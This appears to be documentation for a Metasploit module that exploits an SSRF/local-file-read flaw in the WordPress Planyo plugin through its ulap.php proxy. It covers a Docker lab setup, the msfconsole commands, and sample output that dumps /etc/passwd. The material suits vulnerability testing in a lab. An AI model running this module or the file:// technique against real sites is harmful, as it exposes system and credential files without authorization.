## Vulnerable Application

Planyo Online Reservation System plugin of Wordpress prior to 3.1, fails to validate the scheme of the URL supplied to its AJAX proxy.
This leads to a Server Side Request Forgery (SSRF) vulnerability allowing unauthenticated attackers to retrieve local sensitive files.

This module uses this vulnerability to retrieve the contents of arbitrary local files by supplying a file:// URL to AJAX proxy ulap.php.

### Pre-requisites
- **Docker** and **Docker compose** installed.

## Setup

1. **Create a home directory**
```
mkdir wordpress-docker
cd wordpress-docker
vim docker-compose.yml
```
2. **Create a docker-compose.yml file**
```
services:
  db:
    image: mysql:8.0
    container_name: wordpress-db
    restart: unless-stopped
    environment:
      MYSQL_ROOT_PASSWORD: rootpassword
      MYSQL_DATABASE: wordpress
      MYSQL_USER: bala
      MYSQL_PASSWORD: password
    volumes:
      - db_data:/var/lib/mysql

  wordpress:
    image: wordpress:latest
    container_name: wordpress
    restart: unless-stopped
    depends_on:
      - db
    ports:
      - "8080:80"
    environment:
      WORDPRESS_DB_HOST: db:3306
      WORDPRESS_DB_USER: bala
      WORDPRESS_DB_PASSWORD: password
      WORDPRESS_DB_NAME: wordpress
    volumes:
      - wordpress_data:/var/www/html

volumes:
  db_data:
  wordpress_data:
```
3. **Start the container**
```
sudo docker-compose up -d
```
4. **Download the vulnerable plugin and copy to relevant folder**
```
svn checkout https://plugins.svn.wordpress.org/planyo-online-reservation-system/tags/2.9/
mv 2.9 planyo-online-reservation-system
sudo docker cp planyo-online-reservation-system wordpress:/var/www/html/wp-content/plugins/
```
5. **Complete Wordpress Installation**
- Navigate to http://localhost:8080 and select English when asked for the language.
- Enter a site title, username, password and email address.
6. **Activate the plugin**
- Log into admin dashboard at http://localhost:8080/wp-login.php by entering the username and password configured in the previous step.
- On the left hand menu, select Plugins-\> Installed Plugins
- Locate the planyo plugin and click on Activate.

## Verification Steps
1. **Launch Metasploit**
```
msfconsole
```
2. **Load the Planyo LFI scanner**
```
use auxiliary/gather/wp_planyo_lfi_cve_2026_3576
set RHOSTS 127.0.0.1
set RPORT 8080
set TARGETURI /
```
3. **Run the module**
```
run
```
4. **Observe output**

The module should:
- Check if the target is alive and has installed Wordpress
- Check the plugin version and identify if it is vulnerable
- Retrieve the file and save it locally

## Options

- **TARGETURI**(`/`): Base path to Wordpress
- **FILEPATH**(`/etc/passwd`): Path of local file to download

## Scenarios
```
msf auxiliary(gather/wp_planyo_lfi_cve_2026_3576) > run
[*] Running module against 127.0.0.1
[+] Planyo plugin found: {:version=>"2.9"}
[+] This version of plugin is vulnerable
[*] File saved to: /home/kali/.msf4/loot/20260810080420_default_127.0.0.1_planyo.http_669878.bin
[*] Auxiliary module execution completed
msf auxiliary(gather/wp_planyo_lfi_cve_2026_3576) > cat /home/kali/.msf4/loot/20260810080420_default_127.0.0.1_planyo.http_669878.bin
[*] exec: cat /home/kali/.msf4/loot/20260810080420_default_127.0.0.1_planyo.http_669878.bin

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```
